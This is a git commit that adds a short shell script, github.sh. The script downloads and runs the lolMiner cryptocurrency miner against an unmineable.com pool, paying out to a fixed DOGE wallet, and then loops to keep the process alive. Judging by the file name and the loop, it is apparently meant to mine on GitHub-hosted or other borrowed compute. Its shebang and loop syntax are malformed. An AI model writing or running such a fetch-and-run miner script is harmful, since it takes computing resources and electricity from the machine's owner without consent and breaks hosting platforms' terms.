8a202c23ca18ea198ac18a8a09f288dc3c903804
gerbangkesatu <90879055+gerbangkesatu@users.noreply.github.com>
2021-09-17 08:14:41 +0700

    Create github.sh

---
+++ github.sh
@@ -0,0 +1,8 @@
+#l/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -zxvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && clear && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DOGE:D6VLaCwEC8ju1LRgzyf5EgSLQtEMZzvQJK.GerbangKehidupan --ethstratum ETHPROXY
+while [1]; do
+sleep 3
+done
+sleep 999
